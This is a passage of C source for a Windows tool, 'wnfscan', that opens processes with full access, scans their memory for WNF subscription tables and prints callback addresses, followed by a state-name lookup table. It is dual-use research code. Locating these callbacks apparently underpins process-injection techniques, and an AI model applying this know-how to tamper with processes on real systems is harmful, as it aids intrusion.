    BYTE                   buffer[sizeof(SYMBOL_INFO)+MAX_SYM_NAME*sizeof(WCHAR)];
    PSYMBOL_INFO           pSymbol=(PSYMBOL_INFO)buffer;
    
    // read NamesTableEntry into local memory
    bRead = ReadProcessMemory(
      hp, 
      (PBYTE)addr + offsetof(WNF_SUBSCRIPTION_TABLE, NamesTableEntry), 
      &stle, sizeof(stle), &rd);
    if(!bRead) return;
    
    wprintf(L"*********************************************\n");
    wprintf(L"Found WNF_SUBSCRIPTION_TABLE for %ws:%i at %p\n", 
      pe32->szExeFile, pe32->th32ProcessID, addr);
      
    // for each name subscription
    nte = stle.Flink;
    for(;;) {    
      // read WNF_NAME_SUBSCRIPTION into local memory    
      p = (PBYTE)nte - offsetof(WNF_NAME_SUBSCRIPTION, NamesTableEntry);
      bRead = ReadProcessMemory(
        hp, (PBYTE)p, &ns, sizeof(ns), &rd);
      if(!bRead) break;
      
      x = *(ULONG64*)&ns.StateName;
      // A or B, but not both. Could use an XOR here, too
      if((stateName == 0) != (x == stateName)) {
        wprintf(L"\n\tWNF_NAME_SUBSCRIPTION : %p\n", p);
        wprintf(L"\tStateName : %016llX (%s)\n", x, stateName2str(x));
        
        // for each user subscription
        use = ns.SubscriptionsListHead.Flink;
        for(;;) {
          // read WNF_USER_SUBSCRIPTION into local memory
          p = (PBYTE)use - offsetof(WNF_USER_SUBSCRIPTION, SubscriptionsListEntry);
          bRead = ReadProcessMemory(
            hp, (PBYTE)p, &us, sizeof(us), &rd);
          if(!bRead) break;
            
          wprintf(L"\n\t\tWNF_USER_SUBSCRIPTION : %p\n", p);
          
          // display callback
          
          ZeroMemory(cbfile, ARRAYSIZE(cbfile));
          
          GetMappedFileName(hp, 
            (LPVOID)us.Callback, cbfile, MAX_PATH);
          PathStripPath(cbfile);
           
          wprintf(L"\t\tCallback : %p : %s", 
            us.Callback, cbfile);

          pSymbol->SizeOfStruct = sizeof(SYMBOL_INFO);
          pSymbol->MaxNameLen   = MAX_SYM_NAME;
          
          if(SymFromAddr(hp, (DWORD64)us.Callback, 0, pSymbol)) {
            wprintf(L"!%hs", pSymbol->Name);
          }
          putchar('\n');

          // display context          
          ZeroMemory(ctfile, ARRAYSIZE(ctfile));
          
          GetMappedFileName(hp, 
            (LPVOID)us.CallbackContext, ctfile, MAX_PATH);
          PathStripPath(ctfile);

          wprintf(L"\t\tContext  : %p : %s", 
            us.CallbackContext,  ctfile);
          
          pSymbol->SizeOfStruct = sizeof(SYMBOL_INFO);
          pSymbol->MaxNameLen   = MAX_SYM_NAME;
          
          if(SymFromAddr(hp, (DWORD64)us.CallbackContext, NULL, pSymbol)) {
            wprintf(L"!%hs", pSymbol->Name);
          }
          putchar('\n');
          
          // last one? break from loop
          if(use == ns.SubscriptionsListHead.Blink) break;
          
          // read LIST_ENTRY
          bRead = ReadProcessMemory(
            hp, (PBYTE)use, &usle, sizeof(LIST_ENTRY), &rd);
          if(!bRead) break;
          
          use = usle.Flink;
        }
        if(stateName != 0) break;
      }
      // last one? break from loop
      if(nte == stle.Blink) break;
        
      // read LIST_ENTRY
      bRead = ReadProcessMemory(
        hp, (PBYTE)nte, &nsle, sizeof(nsle), &rd);
      if(!bRead) break;
      
      nte = nsle.Flink;
    }
}

// try find the subscription table by header
// returns TRUE if found, else FALSE
BOOL FindWnfSubTable(
    HANDLE                    hp, 
    PMEMORY_BASIC_INFORMATION mbi,
    PPROCESSENTRY32           pe32,
    ULONG64                   stateName) 
{
    SIZE_T                 pos;
    BOOL                   bRead;
    SIZE_T                 rd;
    WNF_SUBSCRIPTION_TABLE st;

    for(pos = 0;
        pos < (mbi->RegionSize - sizeof(WNF_SUBSCRIPTION_TABLE));
        pos++) 
    {  
      // try read size of table
      bRead = ReadProcessMemory(
        hp, (PBYTE)mbi->BaseAddress + pos, &st, 
        sizeof(WNF_SUBSCRIPTION_TABLE), &rd);

      if(!bRead || rd != sizeof(WNF_SUBSCRIPTION_TABLE)) break;

        // found it?
      if(st.Header.NodeTypeCode == WNF_NODE_SUBSCRIPTION_TABLE && 
         st.Header.NodeByteSize == sizeof(WNF_SUBSCRIPTION_TABLE)) {
        // dump entries and return
        DumpWnfTable(hp, (PBYTE)mbi->BaseAddress + pos, pe32, stateName);
        return TRUE;
      }
    }
    return FALSE;
}

// scan writeable areas of memory in a process
// for each address, pass to FindWnfData
VOID ScanProcess(PPROCESSENTRY32 pe32, ULONG64 stateName) {
    HANDLE                   hp;
    SYSTEM_INFO              si;
    MEMORY_BASIC_INFORMATION mbi;
    LPBYTE                   addr;
    SIZE_T                   res;
    WNF_USER_SUBSCRIPTION    sub;
    
    hp = OpenProcess(
      PROCESS_ALL_ACCESS, 
      FALSE, 
      pe32->th32ProcessID);
    
    if(hp != NULL) {
      SymInitialize(hp, NULL, TRUE);
      
      GetSystemInfo(&si);
      
      for(addr = 0; 
          addr < (LPBYTE)si.lpMaximumApplicationAddress;
          addr = (PBYTE)mbi.BaseAddress + mbi.RegionSize) 
      {
        ZeroMemory(&mbi, sizeof(mbi));
        res = VirtualQueryEx(hp, addr, &mbi, sizeof(mbi));
        if(res != sizeof(mbi)) break;
        
        // heap memory? (can be stack too)
        if ((mbi.State   == MEM_COMMIT)  &&
            (mbi.Type    == MEM_PRIVATE) && 
            (mbi.Protect == PAGE_READWRITE))  
        {
          // try find user sub in this block
          if(FindWnfSubTable(hp, &mbi, pe32, stateName)) break;
        }
      }
      SymCleanup(hp);
      CloseHandle(hp);
    }
}

// read the VA of WNF sub table in NTDLL data section
LPVOID GetWnfSubTableVA(VOID) {
    LPVOID                   ntdll, va = NULL;
    PIMAGE_DOS_HEADER        dos;
    PIMAGE_NT_HEADERS        nt;
    PIMAGE_SECTION_HEADER    sh;
    DWORD                    i, cnt, res;
    PULONG_PTR               ds;
    MEMORY_BASIC_INFORMATION mbi;
    PWNF_SUBSCRIPTION_TABLE  tbl;
    
    // Storage Protection Windows Runtime automatically subscribes to WNF. 
    // Loading efswrt.dll will create the table if not already initialized.
    LoadLibrary(L"efswrt.dll");
    // get local RVA of subscription table
    ntdll = GetModuleHandle(L"ntdll.dll");

    dos = (PIMAGE_DOS_HEADER)ntdll;  
    nt  = RVA2VA(PIMAGE_NT_HEADERS, ntdll, dos->e_lfanew);  
    sh  = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader + 
            nt->FileHeader.SizeOfOptionalHeader);
             
    // locate the .data segment, save VA and number of pointers
    for(i=0; i<nt->FileHeader.NumberOfSections; i++) {
      if(*(PDWORD)sh[i].Name == *(PDWORD)".data") {
        ds  = RVA2VA(PULONG_PTR, ntdll, sh[i].VirtualAddress);
        cnt = sh[i].Misc.VirtualSize / sizeof(ULONG_PTR);
        break;
      }
    }
    
    // for each pointer
    for(i=0; i<cnt; i++) {
      // if this is not a pointer to the heap, skip it
      if(!IsHeapPtr((LPVOID)ds[i])) continue;
      
      tbl = (PWNF_SUBSCRIPTION_TABLE)ds[i];
      // if it looks like subscription table resides here
      if(tbl->Header.NodeTypeCode == WNF_NODE_SUBSCRIPTION_TABLE && 
         tbl->Header.NodeByteSize == sizeof(WNF_SUBSCRIPTION_TABLE)) 
      {
        // save the virtual address and exit loop
        va = &ds[i];
        break;
      }
    }
    return va;
}

VOID ScanSystem(DWORD pid, ULONG64 stateName) {
    HANDLE         ss;
    PROCESSENTRY32 pe;
    HANDLE         hp;
    ULONG_PTR      ptr;
    SIZE_T         rd;
    LPVOID         wnf_va;
    
    wnf_va = GetWnfSubTableVA();
    
    if(wnf_va == NULL) {
      wprintf(L"WARNING: Unable to resolve address of WNF Subscription table."
              L"Scanning will take much longer.\n");
    }
    
    ss = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(ss == INVALID_HANDLE_VALUE) return;
    
    pe.dwSize = sizeof(PROCESSENTRY32);

    if(Process32First(ss, &pe)){
      do {
        if(pid != 0 && pe.th32ProcessID != pid) continue;
        
        if(wnf_va == NULL) {
          ScanProcess(&pe, stateName);
        } else {
          hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
          if(hp != NULL) {
            SymInitialize(hp, NULL, TRUE);
            // read the heap pointer from remote process
            ReadProcessMemory(hp, wnf_va, &ptr, sizeof(ULONG_PTR), &rd);        
            // read a user subscription from remote
            DumpWnfTable(hp, (LPVOID)ptr, &pe, stateName);
            SymCleanup(hp);
            CloseHandle(hp);
          } else {
            xstrerror(pe.szExeFile);
          }
        }
      } while(Process32Next(ss, &pe));
    }
    CloseHandle(ss);
}

void usage(void) {
    wprintf(L"usage: wnfscan <process> -n <state name>\n");
    exit(0);
}

int wmain(int argc, WCHAR *argv[]) {
    int     i;
    WCHAR   *name = NULL, *process = NULL;
    ULONG64 stateName = 0;
    DWORD   pid = 0;
    
    for(i=1; i<=argc-1; i++) {
      // is this a switch?
      if(argv[i][0]==L'/' || argv[i][0]==L'-'){
        // check it out
        switch(argv[i][1]) {
          case L'n':
            name = argv[++i];
            break;
          case L'?':
          case L'h':
          default:
            usage();
            break;
        }
      } else if (process==NULL) {
        process = argv[i];
      }
    }
    // scan process? get the pid
    if(process != NULL) {
      pid = name2pid(process);
      if(pid == 0) pid = wcstoull(process, NULL, 10);
      if(pid == 0) {
        wprintf(L"ERROR: unable to resolve pid for \"%s\".\n", process);
        return -1;
      }
    }
    // filter by state name?
    if(name != NULL) {
      // try converting string to integer
      stateName = strName2state(name);
      if(stateName == 0) {
        stateName = wcstoull(name, NULL, 16);
        if(stateName == 0) {
          wprintf(L"ERROR: state name is unrecognized.\n");
          return -1;
        }
      }
    }
    // try enable debug privilege
    if(!SetPrivilege(SE_DEBUG_NAME, TRUE)) {
      wprintf(L"WARNING: could not enable debugging privilege.\n");
    }
    SymSetOptions(SYMOPT_DEFERRED_LOADS);
    // scan process
    wprintf(L"Scanning %s\n", pid==0 ? L"all" : process);
    ScanSystem(pid, stateName);
    return 0;
}
static WnfName WnfNameMap[1164];

const WCHAR *stateName2str(ULONG64 StateName) {
    DWORD              i;
    static const WCHAR *str;
    
    str = L"Unresolved";
    
    for(i=0; WnfNameMap[i].Name != 0; i++) {
      if(WnfNameMap[i].StateName == (StateName)) {
        str = WnfNameMap[i].Name;
        break;
      }
    }
    return str;
}

ULONG64 strName2state(const WCHAR *name) {
    DWORD i;
    
    for(i=0; WnfNameMap[i].Name != 0; i++) {
      if(lstrcmpi(WnfNameMap[i].Name, name)==0) {
        return WnfNameMap[i].StateName;
      }
    }
    return 0;
}

static WnfName WnfNameMap[1164] = 
{	{L"WNF_A2A_APPURIHANDLER_INSTALLED", 0x41877c2ca3bc0875}, 
	{L"WNF_AAD_DEVICE_REGISTRATION_STATUS_CHANGE", 0x41820f2ca3bc0875}, 
	{L"WNF_AA_CURATED_TILE_COLLECTION_STATUS", 0x41c60f2ca3bc1075}, 
	{L"WNF_AA_LOCKDOWN_CHANGED", 0x41c60f2ca3bc0875}, 
	{L"WNF_AA_MDM_STATUS_EVENT_LOGGED", 0x41c60f2ca3bc1875}, 
	{L"WNF_ACC_EC_ENABLED", 0x41850d2ca3bc0835}, 
	{L"WNF_ACHK_SP_CORRUPTION_DETECTED", 0xa8e0d2ca3bc0875}, 
	{L"WNF_ACT_DATA_UPDATED", 0x41920d2ca3bc0835}, 
	{L"WNF_AFD_IGNORE_ORDERLY_RELEASE_CHANGE", 0x4182082ca3bc0875}, 
	{L"WNF_AI_PACKAGEINSTALL", 0x41c6072ca3bc1075}, 
	{L"WNF_AI_PACKAGEUNINSTALL", 0x41c6072ca3bc2075}, 
	{L"WNF_AI_PACKAGEUPDATE", 0x41c6072ca3bc1875}, 
	{L"WNF_AI_USERTILE", 0x41c6072ca3bc0875}, 
	{L"WNF_AOW_BOOT_PROGRESS", 0x4191012ca3bc0875}, 
	{L"WNF_APXI_CRITICAL_PACKAGES_INSTALLED", 0x89e1e2ca3bc0875}, 
	{L"WNF_ATP_PUSH_NOTIFICATION_RECEIVED", 0x41961a2ca3bc0875}, 
	{L"WNF_AUDC_CAPTURE", 0x2821b2ca3bc4075}, 
	{L"WNF_AUDC_CHAT_APP_CONTEXT", 0x2821b2ca3bc6075}, 
	{L"WNF_AUDC_CPUSET_ID", 0x2821b2ca3bc08b5}, 
	{L"WNF_AUDC_CPUSET_ID_SYSTEM", 0x2821b2ca3bc2875}, 
	{L"WNF_AUDC_DEFAULT_RENDER_ENDPOINT_PROPERTIES", 0x2821b2ca3bc5875}, 
	{L"WNF_AUDC_HEALTH_PROBLEM", 0x2821b2ca3bc2075}, 
	{L"WNF_AUDC_PHONECALL_ACTIVE", 0x2821b2ca3bc1075}, 
	{L"WNF_AUDC_RENDER", 0x2821b2ca3bc3075}, 
	{L"WNF_AUDC_RINGERVIBRATE_STATE_CHANGED", 0x2821b2ca3bc4875}, 
	{L"WNF_AUDC_SPATIAL_STATUS", 0x2821b2ca3bc5075}, 
	{L"WNF_AUDC_TUNER_DEVICE_AVAILABILITY", 0x2821b2ca3bc1875}, 
	{L"WNF_AUDC_VOLUME_CONTEXT", 0x2821b2ca3bc3875}, 
	{L"WNF_AVA_SOUNDDETECTOR_PATTERN_MATCH", 0x4187182ca3bc0875}, 
	{L"WNF_AVLC_DRIVER_REQUEST", 0x28a182ca3bc0875}, 
	{L"WNF_AVLC_SHOW_VOLUMELIMITWARNING", 0x28a182ca3bc1875}, 
	{L"WNF_AVLC_VOLUME_WARNING_ACCEPTED", 0x28a182ca3bc1075}, 
	{L"WNF_BCST_APP_BROADCAST_STREAM_STATE", 0x15950d2fa3bc0875}, 
	{L"WNF_BI_APPLICATION_SERVICING_START_CHANNEL", 0x41c6072fa3bc3875}, 
	{L"WNF_BI_APPLICATION_SERVICING_STOP_CHANNEL", 0x41c6072fa3bc4075}, 
	{L"WNF_BI_APPLICATION_UNINSTALL_CHANNEL", 0x41c6072fa3bc3075}, 
	{L"WNF_BI_BI_READY", 0x41c6072fa3bc6835}, 
	{L"WNF_BI_BROKER_WAKEUP_CHANNEL", 0x41c6072fa3bc0875}, 
	{L"WNF_BI_EVENT_DELETION", 0x41c6072fa3bc5075}, 
	{L"WNF_BI_LOCK_SCREEN_UPDATE_CHANNEL", 0x41c6072fa3bc4875}, 
	{L"WNF_BI_NETWORK_LIMITED_CHANNEL", 0x41c6072fa3bc8075}, 
	{L"WNF_BI_NOTIFY_NEW_SESSION", 0x41c6072fa3bc7075}, 
	{L"WNF_BI_PSM_TEST_HOOK_CHANNEL", 0x41c6072fa3bc5875}, 
	{L"WNF_BI_QUERY_APP_USAGE", 0x41c6072fa3bc7875}, 
	{L"WNF_BI_QUIET_MODE_UPDATE_CHANNEL", 0x41c6072fa3bc6075}, 
	{L"WNF_BI_SESSION_CONNECT_CHANNEL", 0x41c6072fa3bc2075}, 
	{L"WNF_BI_SESSION_DISCONNECT_CHANNEL", 0x41c6072fa3bc2875}, 
	{L"WNF_BI_USER_LOGOFF_CHANNEL", 0x41c6072fa3bc1875}, 
	{L"WNF_BI_USER_LOGON_CHANNEL", 0x41c6072fa3bc1075}, 
	{L"WNF_BLTH_BLUETOOTH_AUDIO_GATEWAY_STATUS", 0x992022fa3bc1075}, 
	{L"WNF_BLTH_BLUETOOTH_AVRCP_VOLUME_CHANGED", 0x992022fa3bc4075}, 
	{L"WNF_BLTH_BLUETOOTH_CONNECTION_STATE_CHANGE", 0x992022fa3bc2075}, 
	{L"WNF_BLTH_BLUETOOTH_DEVICE_BATTERY_IS_LOW", 0x992022fa3bc4875}, 
	{L"WNF_BLTH_BLUETOOTH_DEVICE_DOCK_STATUS", 0x992022fa3bc6075}, 
	{L"WNF_BLTH_BLUETOOTH_GATT_CLIENT_LEGACY_INVALIDATE_TOKEN", 0x992022fa3bc3075}, 
	{L"WNF_BLTH_BLUETOOTH_GATT_CLIENT_LEGACY_REQUEST", 0x992022fa3bc2875}, 
	{L"WNF_BLTH_BLUETOOTH_HFP_HF_LINE_AVAILABLE", 0x992022fa3bc6875}, 
	{L"WNF_BLTH_BLUETOOTH_LE_ADV_SCANNING_STATUS", 0x992022fa3bc5075}, 
	{L"WNF_BLTH_BLUETOOTH_MAP_STATUS", 0x992022fa3bc1875}, 
	{L"WNF_BLTH_BLUETOOTH_QUICKPAIR_STATUS_CHANGED", 0x992022fa3bc3875}, 
	{L"WNF_BLTH_BLUETOOTH_SHOW_PBAP_CONSENT", 0x992022fa3bc5875}, 
	{L"WNF_BLTH_BLUETOOTH_STATUS", 0x992022fa3bc0875}, 
	{L"WNF_BMP_BG_PLAYBACK_REVOKED", 0x4196032fa3bc1075}, 
	{L"WNF_BMP_BG_PLAYSTATE_CHANGED", 0x4196032fa3bc0875}, 
	{L"WNF_BOOT_DIRTY_SHUTDOWN", 0x1589012fa3bc0875}, 
	{L"WNF_BOOT_INVALID_TIME_SOURCE", 0x1589012fa3bc1075}, 
	{L"WNF_BOOT_MEMORY_PARTITIONS_RESTORE", 0x1589012fa3bc1875}, 
	{L"WNF_BRI_ACTIVE_WINDOW", 0x418f1c2fa3bc0875}, 
	{L"WNF_CAM_ACTIVITY_ACCESS_CHANGED", 0x418b0f2ea3bcd875}, 
	{L"WNF_CAM_APPACTIVATION_WITHVOICEABOVELOCK_CHANGED", 0x418b0f2ea3bcf875}, 
	{L"WNF_CAM_APPACTIVATION_WITHVOICE_CHANGED", 0x418b0f2ea3bcf075}, 
	{L"WNF_CAM_APPDIAGNOSTICS_ACCESS_CHANGED", 0x418b0f2ea3bc0875}, 
	{L"WNF_CAM_APPOINTMENTS_ACCESS_CHANGED", 0x418b0f2ea3bc1075}, 
	{L"WNF_CAM_BLUETOOTHSYNC_ACCESS_CHANGED", 0x418b0f2ea3bce075}, 
	{L"WNF_CAM_BLUETOOTH_ACCESS_CHANGED", 0x418b0f2ea3bc1875}, 
	{L"WNF_CAM_BROADFILESYSTEMACCESS_ACCESS_CHANGED", 0x418b0f2ea3bcd075}, 
	{L"WNF_CAM_CAMERA_ACCESS_CHANGED", 0x418b0f2ea3bc2075}, 
	{L"WNF_CAM_CELLULARDATA_ACCESS_CHANGED", 0x418b0f2ea3bc2875}, 
	{L"WNF_CAM_CHAT_ACCESS_CHANGED", 0x418b0f2ea3bc3075}, 
	{L"WNF_CAM_CONTACTS_ACCESS_CHANGED", 0x418b0f2ea3bc3875}, 
	{L"WNF_CAM_DOCUMENTSLIBRARY_ACCESS_CHANGED", 0x418b0f2ea3bcb075}, 
	{L"WNF_CAM_EMAIL_ACCESS_CHANGED", 0x418b0f2ea3bc4075}, 
	{L"WNF_CAM_GAZEINPUT_ACCESS_CHANGED", 0x418b0f2ea3bcc875}, 
	{L"WNF_CAM_HID_ACCESS_CHANGED", 0x418b0f2ea3bc4875}, 
	{L"WNF_CAM_LOCATION_ACCESS_CHANGED", 0x418b0f2ea3bc5075}, 
	{L"WNF_CAM_MICROPHONE_ACCESS_CHANGED", 0x418b0f2ea3bc5875}, 
	{L"WNF_CAM_PHONECALLHISTORY_ACCESS_CHANGED", 0x418b0f2ea3bc6875}, 
	{L"WNF_CAM_PHONECALL_ACCESS_CHANGED", 0x418b0f2ea3bc6075}, 
	{L"WNF_CAM_PICTURESLIBRARY_ACCESS_CHANGED", 0x418b0f2ea3bcb875}, 
	{L"WNF_CAM_POS_ACCESS_CHANGED", 0x418b0f2ea3bc7075}, 
	{L"WNF_CAM_RADIOS_ACCESS_CHANGED", 0x418b0f2ea3bc7875}, 
	{L"WNF_CAM_SENSORSCUSTOM_ACCESS_CHANGED", 0x418b0f2ea3bc8075}, 
	{L"WNF_CAM_SERIAL_ACCESS_CHANGED", 0x418b0f2ea3bc8875}, 
	{L"WNF_CAM_USB_ACCESS_CHANGED", 0x418b0f2ea3bc9075}, 
	{L"WNF_CAM_USERACCOUNTINFO_ACCESS_CHANGED", 0x418b0f2ea3bc9875}, 
	{L"WNF_CAM_USERDATATASKS_ACCESS_CHANGED", 0x418b0f2ea3bca075}, 
	{L"WNF_CAM_USERNOTIFICATIONLISTENER_ACCESS_CHANGED", 0x418b0f2ea3bca875}, 
	{L"WNF_CAM_VIDEOSLIBRARY_ACCESS_CHANGED", 0x418b0f2ea3bcc075}, 
	{L"WNF_CAM_WIFIDIRECT_ACCESS_CHANGED", 0x418b0f2ea3bce875}, 
	{L"WNF_CAPS_CENTRAL_ACCESS_POLICIES_CHANGED", 0x12960f2ea3bc0875}, 
	{L"WNF_CCTL_BUTTON_REQUESTS", 0xd920d2ea3bc08b5}, 
	{L"WNF_CDP_ALLOW_CLIPBOARDHISTORY_POLICY_CHANGE", 0x41960a2ea3bc8075}, 
	{L"WNF_CDP_ALLOW_CROSSDEVICECLIPBOARD_POLICY_CHANGE", 0x41960a2ea3bc8875}, 
	{L"WNF_CDP_CDPSVC_READY", 0x41960a2ea3bc0875}, 
	{L"WNF_CDP_CDPSVC_STOPPING", 0x41960a2ea3bc1075}, 
	{L"WNF_CDP_CDPUSERSVC_READY", 0x41960a2ea3bc1835}, 
	{L"WNF_CDP_CDPUSERSVC_STOPPING", 0x41960a2ea3bc2035}, 
	{L"WNF_CDP_CDP_ACTIVITIES_RECIEVED", 0x41960a2ea3bc3075}, 
	{L"WNF_CDP_CDP_LOCAL_ACTIVITIES_RECIEVED", 0x41960a2ea3bc6875}, 
	{L"WNF_CDP_CDP_MESSAGES_QUEUED", 0x41960a2ea3bc2875}, 
	{L"WNF_CDP_CDP_NOTIFICATION_ACTION_FORWARD_FAILURE", 0x41960a2ea3bc4075}, 
	{L"WNF_CDP_ENABLE_ACTIVITYFEED_POLICY_CHANGE", 0x41960a2ea3bc5875}, 
	{L"WNF_CDP_PUBLISH_USER_ACTIVITIES_POLICY_CHANGE", 0x41960a2ea3bc6075}, 
	{L"WNF_CDP_UPLOAD_USER_ACTIVITIES_POLICY_CHANGE", 0x41960a2ea3bc7875}, 
	{L"WNF_CDP_USERAUTH_POLICY_CHANGE", 0x41960a2ea3bc3875}, 
	{L"WNF_CDP_USER_NEAR_SHARE_SETTING_CHANGE", 0x41960a2ea3bc5035}, 
	{L"WNF_CDP_USER_RESOURCE_INFO_CHANGED", 0x41960a2ea3bc7075}, 
	{L"WNF_CDP_USER_ROME_SETTING_CHANGE", 0x41960a2ea3bc4835}, 
	{L"WNF_CELL_AIRPLANEMODE", 0xd8a0b2ea3bc3075}, 
	{L"WNF_CELL_AIRPLANEMODE_DETAILS", 0xd8a0b2ea3bc9075}, 
	{L"WNF_CELL_AVAILABLE_OPERATORS_CAN0", 0xd8a0b2ea3bc5075}, 
	{L"WNF_CELL_AVAILABLE_OPERATORS_CAN1", 0xd8a0b2ea3bd5875}, 
	{L"WNF_CELL_CALLFORWARDING_STATUS_CAN0", 0xd8a0b2ea3bd0075}, 
	{L"WNF_CELL_CALLFORWARDING_STATUS_CAN1", 0xd8a0b2ea3bde075}, 
	{L"WNF_CELL_CAN_CONFIGURATION_SET_COMPLETE_MODEM0", 0xd8a0b2ea3be5875}, 
	{L"WNF_CELL_CAN_STATE_CAN0", 0xd8a0b2ea3bc8075}, 
	{L"WNF_CELL_CAN_STATE_CAN1", 0xd8a0b2ea3bd9075}, 
	{L"WNF_CELL_CDMA_ACTIVATION_CAN0", 0xd8a0b2ea3bc4075}, 
	{L"WNF_CELL_CDMA_ACTIVATION_CAN1", 0xd8a0b2ea3bd4875}, 
	{L"WNF_CELL_CONFIGURED_LINES_CAN0", 0xd8a0b2ea3bdf475}, 
	{L"WNF_CELL_CONFIGURED_LINES_CAN1", 0xd8a0b2ea3bdfc75}, 
	{L"WNF_CELL_CSP_WWAN_PLUS_READYNESS", 0xd8a0b2ea3bcf875}, 
	{L"WNF_CELL_DATA_ENABLED_BY_USER_MODEM0", 0xd8a0b2ea3bc6475}, 
	{L"WNF_CELL_DEVICE_INFO_CAN0", 0xd8a0b2ea3bc5875}, 
	{L"WNF_CELL_DEVICE_INFO_CAN1", 0xd8a0b2ea3bd6075}, 
	{L"WNF_CELL_EMERGENCY_CALLBACK_MODE_STATUS", 0xd8a0b2ea3be6875}, 
	{L"WNF_CELL_HOME_OPERATOR_CAN0", 0xd8a0b2ea3bcc075}, 
	{L"WNF_CELL_HOME_OPERATOR_CAN1", 0xd8a0b2ea3bda875}, 
	{L"WNF_CELL_HOME_PRL_ID_CAN0", 0xd8a0b2ea3bcc875}, 
	{L"WNF_CELL_HOME_PRL_ID_CAN1", 0xd8a0b2ea3bdb075}, 
	{L"WNF_CELL_IMSI_CAN0", 0xd8a0b2ea3be2075}, 
	{L"WNF_CELL_IMSI_CAN1", 0xd8a0b2ea3be2875}, 
	{L"WNF_CELL_IMS_STATUS_CAN0", 0xd8a0b2ea3be8075}, 
	{L"WNF_CELL_IMS_STATUS_CAN1", 0xd8a0b2ea3be8875}, 
	{L"WNF_CELL_IWLAN_AVAILABILITY_CAN0", 0xd8a0b2ea3be9075}, 
	{L"WNF_CELL_IWLAN_AVAILABILITY_CAN1", 0xd8a0b2ea3be9875}, 
	{L"WNF_CELL_LEGACY_SETTINGS_MIGRATION", 0xd8a0b2ea3be3075}, 
	{L"WNF_CELL_NETWORK_TIME_CAN0", 0xd8a0b2ea3bc4875}, 
	{L"WNF_CELL_NETWORK_TIME_CAN1", 0xd8a0b2ea3bd5075}, 
	{L"WNF_CELL_NITZ_INFO", 0xd8a0b2ea3bed075}, 
	{L"WNF_CELL_OPERATOR_NAME_CAN0", 0xd8a0b2ea3bc3875}, 
	{L"WNF_CELL_OPERATOR_NAME_CAN1", 0xd8a0b2ea3bd4075}, 
	{L"WNF_CELL_PERSO_STATUS_CAN0", 0xd8a0b2ea3bcb875}, 
	{L"WNF_CELL_PERSO_STATUS_CAN1", 0xd8a0b2ea3bde875}, 
	{L"WNF_CELL_PHONE_NUMBER_CAN0", 0xd8a0b2ea3bc6875}, 
	{L"WNF_CELL_PHONE_NUMBER_CAN1", 0xd8a0b2ea3bd7075}, 
	{L"WNF_CELL_POSSIBLE_DATA_ACTIVITY_CHANGE_MODEM0", 0xd8a0b2ea3bc9875}, 
	{L"WNF_CELL_POWER_STATE_MODEM0", 0xd8a0b2ea3bc0875}, 
	{L"WNF_CELL_PREFERRED_LANGUAGES_SLOT0", 0xd8a0b2ea3be1075}, 
	{L"WNF_CELL_PREFERRED_LANGUAGES_SLOT1", 0xd8a0b2ea3be1875}, 
	{L"WNF_CELL_PS_MEDIA_PREFERENCES_CAN0", 0xd8a0b2ea3bea475}, 
	{L"WNF_CELL_PS_MEDIA_PREFERENCES_CAN1", 0xd8a0b2ea3beac75}, 
	{L"WNF_CELL_RADIO_TYPE_MODEM0", 0xd8a0b2ea3bd0c75}, 
	{L"WNF_CELL_REGISTRATION_CHANGED_TRIGGER_MV", 0xd8a0b2ea3be6075}, 
	{L"WNF_CELL_REGISTRATION_PREFERENCES_CAN0", 0xd8a0b2ea3bc7c75}, 
	{L"WNF_CELL_REGISTRATION_PREFERENCES_CAN1", 0xd8a0b2ea3bd8c75}, 
	{L"WNF_CELL_REGISTRATION_STATUS_CAN0", 0xd8a0b2ea3bc2075}, 
	{L"WNF_CELL_REGISTRATION_STATUS_CAN1", 0xd8a0b2ea3bd2075}, 
	{L"WNF_CELL_REGISTRATION_STATUS_DETAILS_CAN0", 0xd8a0b2ea3bca875}, 
	{L"WNF_CELL_REGISTRATION_STATUS_DETAILS_CAN1", 0xd8a0b2ea3bd9875}, 
	{L"WNF_CELL_SIGNAL_STRENGTH_BARS_CAN0", 0xd8a0b2ea3bc1075}, 
	{L"WNF_CELL_SIGNAL_STRENGTH_BARS_CAN1", 0xd8a0b2ea3bd1075}, 
	{L"WNF_CELL_SIGNAL_STRENGTH_DETAILS_CAN0", 0xd8a0b2ea3be7075}, 
	{L"WNF_CELL_SIGNAL_STRENGTH_DETAILS_CAN1", 0xd8a0b2ea3be7875}, 
	{L"WNF_CELL_SUPPORTED_SYSTEM_TYPES_CAN0", 0xd8a0b2ea3bcb075}, 
	{L"WNF_CELL_SUPPORTED_SYSTEM_TYPES_CAN1", 0xd8a0b2ea3bda075}, 
	{L"WNF_CELL_SYSTEM_CONFIG", 0xd8a0b2ea3bca475}, 
	{L"WNF_CELL_SYSTEM_TYPE_CAN0", 0xd8a0b2ea3bc1875}, 
	{L"WNF_CELL_SYSTEM_TYPE_CAN1", 0xd8a0b2ea3bd1875}, 
	{L"WNF_CELL_UICC_ATR_SLOT0", 0xd8a0b2ea3be3875}, 
	{L"WNF_CELL_UICC_ATR_SLOT1", 0xd8a0b2ea3be4075}, 
	{L"WNF_CELL_UICC_PIN_STATE_SLOT0", 0xd8a0b2ea3bec075}, 
	{L"WNF_CELL_UICC_PIN_STATE_SLOT1", 0xd8a0b2ea3bec875}, 
	{L"WNF_CELL_UICC_SIMSEC_SLOT0", 0xd8a0b2ea3be4875}, 
	{L"WNF_CELL_UICC_SIMSEC_SLOT1", 0xd8a0b2ea3be5075}, 
	{L"WNF_CELL_UICC_STATUS_DETAILS_SLOT0", 0xd8a0b2ea3be0075}, 
	{L"WNF_CELL_UICC_STATUS_DETAILS_SLOT1", 0xd8a0b2ea3be0875}, 
	{L"WNF_CELL_UICC_STATUS_SLOT0", 0xd8a0b2ea3bc2875}, 
	{L"WNF_CELL_UICC_STATUS_SLOT1", 0xd8a0b2ea3bd2875}, 
	{L"WNF_CELL_USER_PREFERRED_POWER_STATE_MODEM0", 0xd8a0b2ea3bc8c75}, 
	{L"WNF_CELL_UTK_PROACTIVE_CMD", 0xd8a0b2ea3bcf075}, 
	{L"WNF_CELL_UTK_SETUP_MENU_SLOT0", 0xd8a0b2ea3bce875}, 
	{L"WNF_CELL_UTK_SETUP_MENU_SLOT1", 0xd8a0b2ea3bdd075}, 
	{L"WNF_CELL_VOICEMAIL_NUMBER_CAN0", 0xd8a0b2ea3bc7075}, 
